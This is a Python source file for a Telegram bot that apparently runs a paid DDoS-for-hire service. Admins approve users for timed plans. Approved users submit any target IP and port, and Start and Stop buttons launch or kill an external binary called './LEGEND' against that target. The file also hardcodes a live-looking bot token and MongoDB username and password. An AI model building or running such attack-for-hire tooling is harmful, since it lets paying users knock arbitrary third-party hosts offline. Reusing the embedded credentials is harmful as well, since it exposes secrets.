import subprocess
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import pymongo

# Configuration
TOKEN = "7846887117:AAH88Rj83iNnnRlZUL4lx2Tsfw85IQjbG6s  # Your Telegram bot token
ADMIN_IDS = {1454925725}  # Replace with your actual admin user ID(s)

# MongoDB setup
mongo_client = pymongo.MongoClient("mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0")
db = mongo_client["TEST"]
users_collection = db["users"]

# Path to your binary
BINARY_PATH = "./LEGEND"

# Global variables
process = None
target_ip = None
target_port = None

approved_users = set()  # Set to store approved users

# Validate IP address
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip)

# Validate port number
def is_valid_port(port):
    return 1 <= port <= 65535

# Start command: Show Attack button if approved
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if user_data is None or user_data.get("expiration_date") < datetime.now():
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    
    approved_users.add(user_id)
    keyboard = [[InlineKeyboardButton("Attack", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Press the Attack button to start configuring the attack.", reply_markup=reply_markup)

# Handle approval command
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])
    plan_value = int(context.args[1])  # Expecting 100 or 200
    days = int(context.args[2])
    
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to approve users.")
        return

    if plan_value not in [100, 200]:
        await update.message.reply_text("Invalid plan. Please use 100 or 200.")
        return

    expiration_date = datetime.now() + timedelta(days=days)
    users_collection.update_one(
        {"user_id": user_id}, 
        {"$set": {"plan": plan_value, "expiration_date": expiration_date}}, 
        upsert=True
    )
    await update.message.reply_text(f"User {user_id} has been approved with plan {plan_value} for {days} days.")

# Handle disapproval command
async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to disapprove users.")
        return

    users_collection.delete_one({"user_id": user_id})
    await update.message.reply_text(f"User {user_id} has been disapproved and can no longer use the bot.")

# Handle button clicks
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer(show_alert=False)  # No alert, just acknowledge the button press
    await query.message.reply_text("Please provide the target IP and port in the format: `<IP> <PORT>`")

# Handle target and port input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    user_id = update.effective_user.id

    user_data = users_collection.find_one({"user_id": user_id})
    if user_data is None or user_data.get("expiration_date") < datetime.now():
        if update.message:  # Check if update.message is not None
            await update.message.reply_text("You are not authorized to use this bot.")
        return

    try:
        target, port = update.message.text.split()
        target_ip = target

        if not is_valid_ip(target_ip):
            if update.message:
                await update.message.reply_text("Invalid IP address. Please enter a valid IP.")
            return
        
        target_port = int(port)

        if not is_valid_port(target_port):
            if update.message:
                await update.message.reply_text("Port must be between 1 and 65535.")
            return

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [InlineKeyboardButton("Start Attack", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset", callback_data='reset')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.message:  # Check if update.message is not None
            await update.message.reply_text(f"Target: {target_ip}, Port: {target_port} configured.\n"
                                            "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        if update.message:  # Check if update.message is not None
            await update.message.reply_text("Invalid format. Please enter in the format: `<IP> <PORT>`")

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    query = update.callback_query
    await query.answer(show_alert=False)  # Acknowledge the button press immediately

    if not target_ip or not target_port:
        await query.message.reply_text("Please configure the target and port first.")
        return

    if process and process.poll() is None:
        await query.message.reply_text("Attack is already running. Please stop it before starting a new one.")
        return

    try:
        # Run the binary with target and port
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Respond with a clean message
        await query.message.reply_text(f"🚀 Attack started on {target_ip}:{target_port}.")
    except Exception as e:
        await query.message.reply_text(f"❌ Error starting attack: {e}")

# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    query = update.callback_query
    await query.answer(show_alert=False)  # Acknowledge the button press immediately

    if not process or process.poll() is not None:
        await query.message.reply_text("No attack is currently running.")
        return

    process.terminate()
    process.wait()
    
    # Respond with a clean message
    await query.message.reply_text("🛑 Attack stopped successfully.")

# Reset the attack settings
async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    target_ip = None
    target_port = None
    await update.callback_query.answer("Resetting the attack settings...")  # Immediate feedback
    await update.callback_query.message.reply_text("🔄 Attack settings reset. Please provide new target and port.")

# Main function to start the bot
def main():
    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register command handlers for user approval/disapproval
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("disapprove", disapprove_user))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(start_attack, pattern='^start_attack$'))
    application.add_handler(CallbackQueryHandler(stop_attack, pattern='^stop_attack$'))
    application.add_handler(CallbackQueryHandler(reset, pattern='^reset$'))

    # Register message handler to handle input for target and port
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
